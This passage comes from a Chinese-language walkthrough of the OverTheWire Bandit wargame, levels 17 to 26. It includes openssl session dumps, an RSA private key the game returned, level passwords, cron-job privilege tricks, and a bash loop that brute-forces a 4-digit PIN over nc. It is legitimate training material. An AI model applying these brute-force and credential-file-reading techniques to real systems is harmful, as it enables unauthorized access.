BglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0ZWQgYnkgTmNhdC4g
U2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3DQEBBQUAA4IBAQBy
qV/aRIcHHbKSksYqANDBrkLgfXKXKeXMZBTBq3Q4rMLF/ux7tGU+2/YPAo/6L0IZ
2/UGcW+/msmgvBE3+j5FnIB/aoqp2M8fksOiaC8OrsJ6bbShEEV+q5VITosF/Nw0
qrpoXa+7l5IF/8tuTCpi4ZQGHX+uoRgufcGkK3c8Gxsb9Xtroz8se7yLU0VKLm4d
/H0Ozu4QkVTaQ+7971pXYHyip3tKuJbCeJOJledvqGvvcaIvE9S1vxEugQUq2K6u
DZfCLU3TR9l29QonH13HtF5mEDNE4KaMtYxM4B4Mo3KMUHVf4hi4nKJVpjs/FSiI
Vpv3P9pqfmYjEQjp7yIz
-----END CERTIFICATE-----
subject=CN = localhost
issuer=CN = localhost
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: RSA-PSS
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 1339 bytes and written 373 bytes
Verification error: certificate has expired
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Server public key is 2048 bit
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 10 (certificate has expired)
---
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: AD5693D41623D8997CC2EE94B1CC7C61F949EFBC34B80DC8421E8B82C6572B65
    Session-ID-ctx:
    Resumption PSK: AFE5847E9831517B3B0BCF4B511501803A902004393C9D3D926CA22524CCE716B6A771D7802C706EF3C94E8C264D4B95
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - a5 d8 4b ca c0 ad 23 28-64 e1 24 b6 18 97 bf 19   ..K...#(d.$.....
    0010 - c4 53 bd cd 78 c9 dd 28-f5 14 4c 9d 30 a0 18 97   .S..x..(..L.0...
    0020 - 5d d6 5b 92 2f 96 7a 0e-ac e2 49 bc e3 d1 a6 79   ].[./.z...I....y
    0030 - 73 37 ea 00 c4 4f 0a 07-4c 4e b9 f8 f4 fe 04 bd   s7...O..LN......
    0040 - cb a9 f5 31 28 a1 b9 07-fd cb 83 8b 8d 93 b8 7f   ...1(...........
    0050 - 51 10 1a b9 7c 4e 10 ab-4b 93 8c c7 88 9f 6e 85   Q...|N..K.....n.
    0060 - 87 e8 fc bc 3d f7 93 f0-2f 55 1d cf 64 80 7c 08   ....=.../U..d.|.
    0070 - f2 1c 95 b9 d1 3f 15 90-57 e1 b1 9e 93 87 1d 72   .....?..W......r
    0080 - 93 ed 83 b8 4b ef d2 bd-1d f5 ca 1b f9 d6 7a ff   ....K.........z.
    0090 - 13 fd 8f 40 43 fe 97 99-2a fa eb f9 52 ad b0 27   ...@C...*...R..'
    00a0 - be 2a a0 5c a7 fd 76 6a-22 58 a4 56 02 e7 f2 13   .*.\..vj&quot;X.V....
    00b0 - 4b 01 58 44 ab 63 3d 3d-fa 7e f7 ac 66 8c ef da   K.XD.c==.~..f...
    00c0 - 79 db d0 58 9f c1 fe 8c-3f 95 19 ed a6 f6 08 e8   y..X....?.......

    Start Time: 1689568148
    Timeout   : 7200 (sec)
    Verify return code: 10 (certificate has expired)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 731D8DE5B4509BB39289FED6CED817A731462808EFAF8C604A5BEE6E85CD12AB
    Session-ID-ctx:
    Resumption PSK: F18769CA70C1B23B9CAFAD3D8682E406B83AF8FC439A378D79ABBB19CD4B59EE837D9121AB1BA7FCCF1F761FA4AFB8F7
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - a5 d8 4b ca c0 ad 23 28-64 e1 24 b6 18 97 bf 19   ..K...#(d.$.....
    0010 - 23 10 a4 f3 c5 e4 25 65-c5 73 a7 ce d3 1b 98 bf   #.....%e.s......
    0020 - 1a 41 ff b2 2e 44 0f c6-a2 7c a6 12 0c 22 7a a9   .A...D...|...&quot;z.
    0030 - 28 d6 09 17 d2 7a 97 5b-a3 37 fc 5c de 86 24 47   (....z.[.7.\..$G
    0040 - 78 20 db 23 15 d1 3d 77-19 b2 91 dc c7 43 d6 66   x .#..=w.....C.f
    0050 - 3c 04 a7 dd b9 32 e6 0f-16 a1 ab dd 92 99 18 e7   &lt;....2..........
    0060 - 23 ad ab 79 3e af 2d ca-ea 4e 29 67 27 39 d2 d4   #..y&gt;.-..N)g'9..
    0070 - e9 6f e0 5b be 0d d4 2d-07 e2 83 10 4a aa 94 20   .o.[...-....J..
    0080 - 1e 06 3d 42 df 74 91 99-43 cc bc ca 5c 59 74 f1   ..=B.t..C...\Yt.
    0090 - df 00 c4 16 44 2d a1 0f-db db 65 84 3b 89 58 b4   ....D-....e.;.X.
    00a0 - 81 71 91 ec 5c 5e a3 db-51 25 b4 37 e5 0d 6b 41   .q..\^..Q%.7..kA
    00b0 - 88 a8 dc 9d b3 02 5b 68-04 4c 01 cd cd a3 17 24   ......[h.L.....$
    00c0 - 4a fe f5 03 49 ab 60 1e-b3 eb 07 04 92 c5 ff ab   J...I.`.........

    Start Time: 1689568148
    Timeout   : 7200 (sec)
    Verify return code: 10 (certificate has expired)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK

Wrong! Please enter the correct current password
closed
</code></pre>
<p>是从这里看出来要输入密码的！</p>
<pre><code>bandit16@bandit:~$ openssl s_client -connect localhost:31790 -ign_eof
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 CN = localhost
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN = localhost
verify error:num=10:certificate has expired
notAfter=Jul 17 03:32:59 2023 GMT
verify return:1
depth=0 CN = localhost
notAfter=Jul 17 03:32:59 2023 GMT
verify return:1
---
Certificate chain
 0 s:CN = localhost
   i:CN = localhost
   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA1
   v:NotBefore: Jul 17 03:31:59 2023 GMT; NotAfter: Jul 17 03:32:59 2023 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIDCzCCAfOgAwIBAgIEasML0jANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls
b2NhbGhvc3QwHhcNMjMwNzE3MDMzMTU5WhcNMjMwNzE3MDMzMjU5WjAUMRIwEAYD
VQQDDAlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDQ
WpK5aICLya01rGDXaLVwQpZqWmn75BPH3O2vrqMAu14iXbKtemseBnOaB3vSfu04
QNfWLYWKrnab4hd73/TOurIHq33MnsH8Yb+lzx6VfBq/FouTviT2QBE5cVlvQV63
QPjJZ4mBomudPpDXLfbHWxsH8BYxa6lSqBjs8EqOnfEL9SRoQ+H0w66NjpOnGtLO
l0oYAbmriOkmOht1tr1hoxiacNZa9WEOq01SNrIRGbhOPw07c7/rVXfz9dDBrhPQ
D7FpX/UDyZvJFM3I+sTpwoUj7Ypzvhim+kVY9lGRnzuy439yGovgURCiNwlXUpDA
/Kr/hRCriC3URJT4mWKdAgMBAAGjZTBjMBQGA1UdEQQNMAuCCWxvY2FsaG9zdDBL
BglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0ZWQgYnkgTmNhdC4g
U2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3DQEBBQUAA4IBAQBy
qV/aRIcHHbKSksYqANDBrkLgfXKXKeXMZBTBq3Q4rMLF/ux7tGU+2/YPAo/6L0IZ
2/UGcW+/msmgvBE3+j5FnIB/aoqp2M8fksOiaC8OrsJ6bbShEEV+q5VITosF/Nw0
qrpoXa+7l5IF/8tuTCpi4ZQGHX+uoRgufcGkK3c8Gxsb9Xtroz8se7yLU0VKLm4d
/H0Ozu4QkVTaQ+7971pXYHyip3tKuJbCeJOJledvqGvvcaIvE9S1vxEugQUq2K6u
DZfCLU3TR9l29QonH13HtF5mEDNE4KaMtYxM4B4Mo3KMUHVf4hi4nKJVpjs/FSiI
Vpv3P9pqfmYjEQjp7yIz
-----END CERTIFICATE-----
subject=CN = localhost
issuer=CN = localhost
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: RSA-PSS
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 1339 bytes and written 373 bytes
Verification error: certificate has expired
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Server public key is 2048 bit
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 10 (certificate has expired)
---
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 1B8DD2D7E7B861C8494FB2E901FEB50552571BFE7200C45C57EEACE66795AEEA
    Session-ID-ctx:
    Resumption PSK: 25F7290250EB5F41F5C184E597BD8493DFD4EC4E8965B10CE6A409D2909B370F30DB9A1E965F680CCD6F9C9E3BC4D0C6
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - a5 d8 4b ca c0 ad 23 28-64 e1 24 b6 18 97 bf 19   ..K...#(d.$.....
    0010 - a1 6b 8c 90 89 4b 8b e8-df 1e 82 05 28 ad a8 5f   .k...K......(.._
    0020 - 65 f3 03 76 14 8f d5 97-8a a5 28 ea 20 2f 06 55   e..v......(. /.U
    0030 - 16 ba 4b 88 de ab 7e 00-1c 76 ba 08 b1 e7 0f a9   ..K...~..v......
    0040 - 1d 53 2a 31 16 6b 02 0d-2e dd e7 9a f4 9a e8 13   .S*1.k..........
    0050 - 13 a1 20 67 4c 24 07 53-18 c1 68 56 30 f4 92 c3   .. gL$.S..hV0...
    0060 - b5 5b a6 4d 99 ff 16 fd-30 72 9b 0e f7 f2 c6 ab   .[.M....0r......
    0070 - 69 c1 c0 b9 16 18 3d 5c-c4 db 4f b9 06 bf 6c 6f   i.....=\..O...lo
    0080 - 51 c4 99 60 fa 03 55 af-ad 46 ed e1 53 0f 92 65   Q..`..U..F..S..e
    0090 - 57 82 b9 5b ce 5b 40 37-4f d5 a8 a3 27 63 b9 2d   W..[.[@7O...'c.-
    00a0 - 6b e4 ea 11 f2 9f c3 f7-82 3d 16 4e 2b 40 d3 25   k........=.N+@.%
    00b0 - 50 10 0f aa 74 30 49 da-c8 01 32 23 c0 b7 3c 8b   P...t0I...2#..&lt;.
    00c0 - 97 8d 24 10 2d 93 73 04-33 01 d9 70 92 26 4e fc   ..$.-.s.3..p.&amp;N.

    Start Time: 1689568162
    Timeout   : 7200 (sec)
    Verify return code: 10 (certificate has expired)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: A0EF32E17C1AC0960FD46EE50181836B83644B2168CDC3087A3612EC77D9A111
    Session-ID-ctx:
    Resumption PSK: 117786B647299C2A691BD342EDC8E39A7899490BE868D804415203AED03876A67C51CE8E55D236DAC96130391C36759A
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - a5 d8 4b ca c0 ad 23 28-64 e1 24 b6 18 97 bf 19   ..K...#(d.$.....
    0010 - f3 b6 fd 9d 6e e3 35 98-ad 1d df 9e 75 38 c5 47   ....n.5.....u8.G
    0020 - 15 7a c4 8f 31 3b 39 1e-ef 1c f2 56 f2 61 48 a9   .z..1;9....V.aH.
    0030 - 36 ae 3d 66 e9 0d 0f ff-07 39 33 77 d7 87 8c 63   6.=f.....93w...c
    0040 - fb 00 ab 1e 27 3a 91 ed-24 49 b6 e2 9d 49 a6 2b   ....':..$I...I.+
    0050 - 90 ce a6 8b ea 1c bd f5-38 77 83 fc 9b 4c b4 49   ........8w...L.I
    0060 - 3b d9 7c bb 52 0b 2d 38-88 a5 80 b0 8e 80 5d 66   ;.|.R.-8......]f
    0070 - 1e 0b 9d 10 b2 81 11 51-0a 30 60 ec b9 2d d2 5e   .......Q.0`..-.^
    0080 - 64 66 87 44 84 78 f8 e5-2b 62 cb 5f 84 aa 50 01   df.D.x..+b._..P.
    0090 - 5d d6 62 fd e8 8b f8 fc-91 0c 8a f9 a7 12 6e ae   ].b...........n.
    00a0 - b9 40 f2 4f 90 01 0e 30-cf bf 16 3a b5 96 fc 3a   .@.O...0...:...:
    00b0 - 9b a5 e0 4a 54 df eb 39-68 be 05 77 6b 50 d7 a3   ...JT..9h..wkP..
    00c0 - 87 0e 7d bf 33 1a 9e 31-40 b6 3e 5e 1f a9 cf d6   ..}.3..1@.&gt;^....

    Start Time: 1689568162
    Timeout   : 7200 (sec)
    Verify return code: 10 (certificate has expired)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
JQttfApK4SeyHwDlI9SXGR50qclOAil1
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

closed
</code></pre>
<p>返回了正确的密钥，然后写入/tmp下的某个文件，然后给它只有自己可读可写即可</p>
<pre><code># 首先需要在tmp下新建一个文件夹，然后把密钥写进去，然后chmod 666那个文件
bandit16@bandit:/tmp/a$ ssh -i 1.private bandit17@localhost -p 2220
--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us on discord or IRC.

  Enjoy your stay!

bandit17@bandit:~$
</code></pre>
<h1 id="level18-2"><a class="header" href="#level18-2">level18</a></h1>
<p>直接diff</p>
<pre><code>bandit17@bandit:~$ diff passwords.old passwords.new
42c42
&lt; glZreTEH1V3cGKL6g4conYqZqaEj0mte
---
&gt; hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg
bandit17@bandit:~$
</code></pre>
<p>然后登录，然后就是：</p>
<pre><code>┌─[myc@ubuntu22]─[~]
└──╼[13:02:46]$ ssh bandit18@bandit.labs.overthewire.org -p 2220
                         _                     _ _ _
                        | |__   __ _ _ __   __| (_) |_
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_
                        |_.__/ \__,_|_| |_|\__,_|_|\__|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

bandit18@bandit.labs.overthewire.org's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--&quot;
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---&quot; ire.org


Welcome to OverTheWire!

If you find any problems, please report them to the #wargames channel on
discord or IRC.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing &quot;somegame&quot;, then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command &quot;mktemp -d&quot; in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
  restricted so that users cannot snoop on eachother. Files and directories
  with easily guessable or short names will be periodically deleted! The /tmp
  directory is regularly wiped.
  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few useful tools which you can find
 in the following locations:

    * gef (https://github.com/hugsy/gef) in /opt/gef/
    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
    * peda (https://github.com/longld/peda.git) in /opt/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)

 Both python2 and python3 are installed.

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us on discord or IRC.

  Enjoy your stay!

Byebye !
Connection to bandit.labs.overthewire.org closed.
</code></pre>
<h1 id="level19-2"><a class="header" href="#level19-2">level19</a></h1>
<p>这个，告诉了你文件名和位置，可以直接读，而不是链接一个bash</p>
<p>因此可以玩儿一个骚操作</p>
<pre><code>┌─[Fail][myc@ubuntu22]─[~]
└──╼[13:09:29]$ ssh bandit18@bandit.labs.overthewire.org -p 2220 -t cat readme
                         _                     _ _ _
                        | |__   __ _ _ __   __| (_) |_
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_
                        |_.__/ \__,_|_| |_|\__,_|_|\__|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

bandit18@bandit.labs.overthewire.org's password:
awhqfNnAbc1naukrpqDYcF95h7HoMTrC
Connection to bandit.labs.overthewire.org closed.
</code></pre>
<h1 id="level20-2"><a class="header" href="#level20-2">level20</a></h1>
<p>就是运行这个小文件</p>
<pre><code>bandit19@bandit:~$ ./bandit20-do --help
Usage: env [OPTION]... [-] [NAME=VALUE]... [COMMAND [ARG]...]
Set each NAME to VALUE in the environment and run COMMAND.

Mandatory arguments to long options are mandatory for short options too.
  -i, --ignore-environment  start with an empty environment
  -0, --null           end each output line with NUL, not newline
  -u, --unset=NAME     remove variable from the environment
  -C, --chdir=DIR      change working directory to DIR
  -S, --split-string=S  process and split S into separate arguments;
                        used to pass multiple arguments on shebang lines
      --block-signal[=SIG]    block delivery of SIG signal(s) to COMMAND
      --default-signal[=SIG]  reset handling of SIG signal(s) to the default
      --ignore-signal[=SIG]   set handling of SIG signals(s) to do nothing
      --list-signal-handling  list non default signal handling to stderr
  -v, --debug          print verbose information for each processing step
      --help     display this help and exit
      --version  output version information and exit

A mere - implies -i.  If no COMMAND, print the resulting environment.

SIG may be a signal name like 'PIPE', or a signal number like '13'.
Without SIG, all known signals are included.  Multiple signals can be
comma-separated.

GNU coreutils online help: &lt;https://www.gnu.org/software/coreutils/&gt;
Full documentation &lt;https://www.gnu.org/software/coreutils/env&gt;
or available locally via: info '(coreutils) env invocation'
bandit19@bandit:~$ ./bandit20-do NAME=11020 cat /etc/bandit_pass/bandit20
VxCazJaVykI6W36BkBU0mJTCM8rR95XT
bandit19@bandit:~$
</code></pre>
<h1 id="level21-2"><a class="header" href="#level21-2">level21</a></h1>
<p>直接看图
<img src="WarGame/image-1.png" alt="level20-21" /></p>
<pre><code>NvEJF7oVjkddltPSrdKEFOllh9V1IBcq
</code></pre>
<h1 id="level22-2"><a class="header" href="#level22-2">level22</a></h1>
<p>就是看守护进程在运行哪个脚本，然后跟着去找。</p>
<pre><code>bandit21@bandit:~$ man cron
bandit21@bandit:~$ man crontab
bandit21@bandit:~$ man 5 crontab
bandit21@bandit:~$ cd /etc/cron.d/
bandit21@bandit:/etc/cron.d$ ll
total 56
drwxr-xr-x   2 root root  4096 Apr 23 18:05 ./
drwxr-xr-x 108 root root 12288 Jun 10 22:51 ../
-rw-r--r--   1 root root    62 Apr 23 18:04 cronjob_bandit15_root
-rw-r--r--   1 root root    62 Apr 23 18:04 cronjob_bandit17_root
-rw-r--r--   1 root root   120 Apr 23 18:04 cronjob_bandit22
-rw-r--r--   1 root root   122 Apr 23 18:04 cronjob_bandit23
-rw-r--r--   1 root root   120 Apr 23 18:04 cronjob_bandit24
-rw-r--r--   1 root root    62 Apr 23 18:04 cronjob_bandit25_root
-rw-r--r--   1 root root   201 Jan  8  2022 e2scrub_all
-rwx------   1 root root    52 Apr 23 18:05 otw-tmp-dir*
-rw-r--r--   1 root root   102 Mar 23  2022 .placeholder
-rw-r--r--   1 root root   396 Feb  2  2021 sysstat
bandit21@bandit:/etc/cron.d$ cat cronjob_bandit15_root
* * * * * root /usr/bin/cronjob_bandit15_root.sh &amp;&gt; /dev/null
bandit21@bandit:/etc/cron.d$ cat cronjob_bandit17_root
* * * * * root /usr/bin/cronjob_bandit17_root.sh &amp;&gt; /dev/null
bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null
bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
bandit21@bandit:/etc/cron.d$
</code></pre>
<h1 id="level23-2"><a class="header" href="#level23-2">level23</a></h1>
<p>和上面那个题几乎一样</p>
<pre><code>bandit22@bandit:~$ cd /etc/cron.d/
bandit22@bandit:/etc/cron.d$ ll
total 56
drwxr-xr-x   2 root root  4096 Apr 23 18:05 ./
drwxr-xr-x 108 root root 12288 Jun 10 22:51 ../
-rw-r--r--   1 root root    62 Apr 23 18:04 cronjob_bandit15_root
-rw-r--r--   1 root root    62 Apr 23 18:04 cronjob_bandit17_root
-rw-r--r--   1 root root   120 Apr 23 18:04 cronjob_bandit22
-rw-r--r--   1 root root   122 Apr 23 18:04 cronjob_bandit23
-rw-r--r--   1 root root   120 Apr 23 18:04 cronjob_bandit24
-rw-r--r--   1 root root    62 Apr 23 18:04 cronjob_bandit25_root
-rw-r--r--   1 root root   201 Jan  8  2022 e2scrub_all
-rwx------   1 root root    52 Apr 23 18:05 otw-tmp-dir*
-rw-r--r--   1 root root   102 Mar 23  2022 .placeholder
-rw-r--r--   1 root root   396 Feb  2  2021 sysstat
bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null
bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo &quot;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget&quot;

cat /etc/bandit_pass/$myname &gt; /tmp/$mytarget
bandit22@bandit:/etc/cron.d$
</code></pre>
<p>拿到脚本以后直接执行一下，不过需要注意用户是bandit23，因为whoami输出的是bandit22</p>
<pre><code>bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
</code></pre>
<h1 id="level24-2"><a class="header" href="#level24-2">level24</a></h1>
<p>还是那几步，然后看到了这玩意儿</p>
<pre><code>bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo || exit 1
echo &quot;Executing and deleting all scripts in /var/spool/$myname/foo:&quot;
for i in * .*;
do
    if [ &quot;$i&quot; != &quot;.&quot; -a &quot;$i&quot; != &quot;..&quot; ];
    then
        echo &quot;Handling $i&quot;
        owner=&quot;$(stat --format &quot;%U&quot; ./$i)&quot;
        if [ &quot;${owner}&quot; = &quot;bandit23&quot; ]; then
            timeout -s 9 60 ./$i
        fi
        rm -rf ./$i
    fi
done
</code></pre>
<pre><code>bandit23@bandit:/var/spool/bandit24$ ll
total 12
dr-xr-x---  3 bandit24 bandit23 4096 Apr 23 18:04 ./
drwxr-xr-x  5 root     root     4096 Apr 23 18:04 ../
drwxrwx-wx 13 root     bandit24 4096 Jul 17 06:58 foo/
bandit23@bandit:/var/spool/bandit24$
# 这里我根本没有写的权限，题改了？？？？？？？
</code></pre>
<p>那也简单，就是把脚本放在foo底下</p>
<p>脚本就是一个输出，水的一批</p>
<pre><code>#!/bin/bash
cat /etc/bandit_pass/bandit24 &gt;&gt; /tmp/bandit23/pass
</code></pre>
<p>然后执行脚本就行，最后得到如下结果：</p>
<pre><code>VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
</code></pre>
<h1 id="level25-2"><a class="header" href="#level25-2">level25</a></h1>
<p>要写爆破脚本</p>
<pre><code>bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.

Fail! You did not supply enough data. Try again.
^C
bandit24@bandit:~$
</code></pre>
<p>脚本如下：</p>
<pre><code>#! /bin/bash
pass24=&quot;VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar&quot;
for i in {0..9}{0..9}{0..9}{0..9}
do
    echo $pass24' '$i &gt;&gt; mydict
done
echo &quot;done loop!&quot;
cat ./mydict | nc localhost 30002 &gt;&gt; re
sort re | uniq -u
</code></pre>
<p><em>上边儿有个题貌似应该用-u的，G</em></p>
<p>最后得到如下结果：</p>
<pre><code>The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
</code></pre>
<h1 id="level26-2"><a class="header" href="#level26-2">level26</a></h1>
<p>登陆上以后出现如下内容：</p>
<pre><code>bandit25@bandit:~$ ll
total 32
drwxr-xr-x  2 root     root     4096 Apr 23 18:04 ./
drwxr-xr-x 70 root     root     4096 Apr 23 18:05 ../
